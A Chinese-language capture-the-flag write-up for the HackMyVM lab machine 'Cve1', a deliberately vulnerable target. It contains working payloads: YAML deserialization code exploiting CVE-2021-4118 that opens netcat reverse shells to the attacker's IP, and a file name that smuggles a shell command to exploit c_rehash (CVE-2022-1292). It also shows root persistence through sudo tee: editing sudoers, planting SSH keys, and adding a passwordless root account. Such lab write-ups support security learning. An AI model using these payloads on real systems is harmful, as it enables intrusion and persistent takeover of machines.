---
title: HMV-Cve1
description: 'Identifies vulnerable software and locates a vulnerability to compromise this host.'
pubDate: 2026-01-12
image: /mechine/Cve1.png
categories:
  - Documentation
tags:
  - Hackmyvm
  - Linux
---

![](https://cdn.nlark.com/yuque/0/2026/png/40628873/1768192533831-9505f27f-bade-4460-84f3-b6d7f06ac490.png)

# 信息收集
## IP定位
```plain
┌──(root㉿kali)-[/home/kali]
└─# arp-scan -l | grep "08:00:27"
WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied
WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied
192.168.0.107   08:00:27:8b:20:d4       (Unknown)
```

## nmap信息收集
```plain
┌──(root㉿kali)-[/home/kali]
└─# nmap -Pn -sTCV -T4 -p0-65535 192.168.0.107
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-11 23:36 EST
Nmap scan report for 192.168.0.107
Host is up (0.00060s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 3a:9a:6c:98:00:a7:c8:66:94:fe:58:7e:61:a7:f9:e8 (RSA)
|   256 9d:6f:0d:13:02:3c:65:45:79:1b:3d:9b:e2:5e:24:5f (ECDSA)
|_  256 82:ba:54:82:f7:1d:a2:65:fc:9f:25:dc:43:ee:7e:4c (ED25519)
80/tcp   open  http    Apache httpd 2.4.54 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.54 (Debian)
9090/tcp open  http    Apache httpd 2.4.54 ((Debian))
|_http-server-header: Apache/2.4.54 (Debian)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.71 seconds
```

## 80端口
![](https://cdn.nlark.com/yuque/0/2026/png/40628873/1768192802646-91405867-93f6-46dd-b8e2-c5098945f0a4.png)

### 目录扫描
简单扫了下没啥东西，估计突破点在9090端口

## 9090端口
![](https://cdn.nlark.com/yuque/0/2026/png/40628873/1768192729170-8e40049b-9a1d-4fc5-976b-18c9da236da7.png)

可以写入后缀为.yaml的文件然后在页面端进行文件名读取

没啥思路，查看源码

```plain
<!DOCTYPE HTML>
<html>
<body style="background-color: rgb(225,225,225)">
<h1>Nuclei War Now!</h1>
    <form name="savefile" method="post" action="">
        File Name: <input type="text" name="filename" value="">.yaml<br/>
        <textarea rows="10" cols="100" name="textdata"></textarea><br/>
        <input type="submit" name="submitsave" value="Save template on the server">
</form>
    <br/><hr style="background-color: rgb(150,150,150); color: rgb(150,150,150); width: 100%; height: 4px;"><br/>
    <form name="openfile" method="post" action="">
        Open File: <input type="text" name="filename" value="">.yaml
        <input type="submit" name="submitopen" value="View content">
</form>
    <br/><hr style="background-color: rgb(150,150,150); color: rgb(150,150,150); width: 100%; height: 4px;"><br/>
    File contents:<br/>
    <!--Backend developed with PyTorch Lightning 1.5.9-->
</body>
</html>

```

## PyTorch Lightning 1.5.9漏洞
没找到

通过看wp得知了该框架下的一个漏洞

[**CVE-2021-4118**](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-4118)

[huntr - The world’s first bug bounty platform for AI/ML](https://huntr.com/bounties/31832f0c-e5bb-4552-a12c-542f81f111e6)

+ PyTorch Lightning 的 `core.saving.load_hparams_from_yaml` 使用了 `**yaml.UnsafeLoader**`。
+ 通过恶意构造的 YAML 文件，可以在加载时执行任意 Python 代码。
+ 本质上是 **远程代码执行（RCE）风险**，只要加载恶意 YAML 文件即可。

利用gobuster扫描该页面

```plain
┌──(root㉿kali)-[/home/kali]
└─# gobuster dir -u http://192.168.0.107:9090 -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php,txt,html,zip,db,bak,js,yaml -t 64  
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.0.107:9090
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              js,yaml,php,txt,html,zip,db,bak
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 280]
/.php                 (Status: 403) [Size: 280]
/index.php            (Status: 200) [Size: 910]
/test.yaml            (Status: 200) [Size: 19]
/manual               (Status: 301) [Size: 322] [--> http://192.168.0.107:9090/manual/]
/file.yaml            (Status: 200) [Size: 0]
/javascript           (Status: 301) [Size: 326] [--> http://192.168.0.107:9090/javascript/]
```

找到了file.yaml

为了获得反向 shell，基于漏洞的“概念验证”，我在终端上运行监听器并创建以下 yaml：

```plain
- !!python/object/new:yaml.MappingNode
  listitems: !!str '!!python/object/apply:subprocess.Popen [["nc","-e", "/bin/bash", "192.168.0.106", "1234"]]'
  state:
    tag: !!str dummy
    value: !!str dummy
    extend: !!python/name:yaml.unsafe_load
```

```plain
id: !!python/object/apply:subprocess.Popen [["nc", "192.168.0.106", "4444", "-c", "sh"]]
```

当我用名为“file”的名上传到服务器时（服务器会自动添加扩展名），我会看到类似 www-data 的 shell。

![](https://cdn.nlark.com/yuque/0/2026/png/40628873/1768196933839-fced37aa-063f-40bd-b42b-14b13a8233d5.png)

我一直以为没有弹回来，结果是没有弹出tty命令行

```plain
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

# 提权-wicca
```plain
www-data@cve-pt1:~$ sudo -l
sudo -l
sudo: unable to resolve host cve-pt1: No address associated with hostname

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for www-data: 

www-data@cve-pt1:~$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/usr/bin/newgrp
/usr/bin/umount
/usr/bin/sudo
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/su
/usr/bin/passwd
/usr/bin/mount
/usr/bin/gpasswd
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper

www-data@cve-pt1:~$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
avahi-autoipd:x:105:114:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
wicca:x:1000:1000:wicca,,,:/home/wicca:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin

www-data@cve-pt1:/etc/cron.d$ ls -al
ls -al
total 28
drwxr-xr-x  2 root root 4096 Dec  7  2022 .
drwxr-xr-x 77 root root 4096 Jan 11 23:40 ..
-rw-r--r--  1 root root  285 Feb  6  2021 anacron
-rw-r--r--  1 root root  418 Dec  7  2022 cve1
-rw-r--r--  1 root root  201 Jun  7  2021 e2scrub_all
-rw-r--r--  1 root root  712 May 11  2020 php
-rw-r--r--  1 root root  102 Feb 22  2021 .placeholder

www-data@cve-pt1:/etc/cron.d$ cat cve1
cat cve1
*/1 * * * * www-data python3 /var/www/cve/2021-4118.py
*/1 * * * * www-data sleep 20; python3 /var/www/cve/2021-4118.py
*/1 * * * * www-data sleep 40; python3 /var/www/cve/2021-4118.py
*/1 * * * * wicca c_rehash /etc/ssl/certs/
*/1 * * * * wicca sleep 30; c_rehash /etc/ssl/certs/
*/1 * * * * root python3 /root/0845.py
*/1 * * * * root sleep 20; python3 /root/0845.py
*/1 * * * * root sleep 40; python3 /root/0845.py
```

在查找计划任务时发现有一个叫 `Wicca` 的用户

`c_rehash` 命令有一个漏洞 **CVE-2022-1292**，[[https://github.com/alcaparra/CVE-2022-1292/blob/main/README.md](https://github.com/alcaparra/CVE-2022-1292/blob/main/README.md)]

```plain
www-data@cve-pt1:~$ ls -la /usr/bin/c_rehash
ls -la /usr/bin/c_rehash
-rwxr-xr-x 1 root root 6176 Dec  6  2022 /usr/bin/c_rehash

访问 /etc/ssl/certs/（默认）或 update-ca-certificates 中配置的其他路径
www-data@cve-pt1:/etc/cron.d$ cd /etc/ssl/certs/
cd /etc/ssl/certs/

echo "-----BEGIN CERTIFICATE-----" > "hey.crt\`nc -c sh 192.168.0.106 12345\`" （NC 作为有效载荷示例）
```

等一分钟

```plain
┌──(kali㉿kali)-[~]
└─$ nc -lvvp 12345
listening on [any] 12345 ...
192.168.0.107: inverse host lookup failed: Unknown host
connect to [192.168.0.106] from (UNKNOWN) [192.168.0.107] 59288
id
uid=1000(wicca) gid=1000(wicca) groups=1000(wicca)
```

```plain
HMVM{e49553320c33fa8866cddae2954ee228}
```

# 提权-root
```plain
wicca@cve-pt1:~$ sudo -l
sudo -l
sudo: unable to resolve host cve-pt1: No address associated with hostname
Matching Defaults entries for wicca on cve-pt1:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User wicca may run the following commands on cve-pt1:
    (root) NOPASSWD: /usr/bin/tee

```

(wicca) NOPASSWD: /usr/bin/tee

👉 tee 以 root 身份运行

👉 可以 向任意 root 可写文件写内容

👉 = 直接 root



## 🚀 方法一（最推荐）：写 `/etc/sudoers` → 永久 root
给 wicca 直接加 sudo ALL 权限。

### 1️⃣ 执行（一次就够）
```plain
echo "wicca ALL=(ALL) NOPASSWD: ALL" | sudo tee -a /etc/sudoers
```

### 2️⃣ 验证
```plain
sudo -l
```

### 3️⃣ 直接 root
```plain
sudo -i
```

✅ **这是最稳定、最干净的提权方式**

---

## 🚀 方法二：写 root 的 SSH key（免密 root 登录）
如果你想 **长期稳定控制** 这台机子。

### 1️⃣ 本地生成 key（Kali）
```plain
ssh-keygen -t rsa
```

### 2️⃣ 把公钥写进 root
```plain
cat ~/.ssh/id_rsa.pub | sudo tee -a /root/.ssh/authorized_keys
```

### 3️⃣ 直接 root 登录
```plain
ssh root@cve-pt1
```

---

## 🚀 方法三：覆盖关键文件（一次性 root shell）
### 方式 A：覆盖 `/etc/passwd`（不太推荐但能用）
```plain
echo 'root2::0:0:root:/root:/bin/bash' | sudo tee -a /etc/passwd
su root2
```

⚠️ 改 passwd 文件在实战里不优雅，但 CTF 可用。





```plain
root@cve-pt1:~# cat root.txt
cat root.txt
HMVM{01cefdb2ed88aa502ec4149bb19ebae6}
```

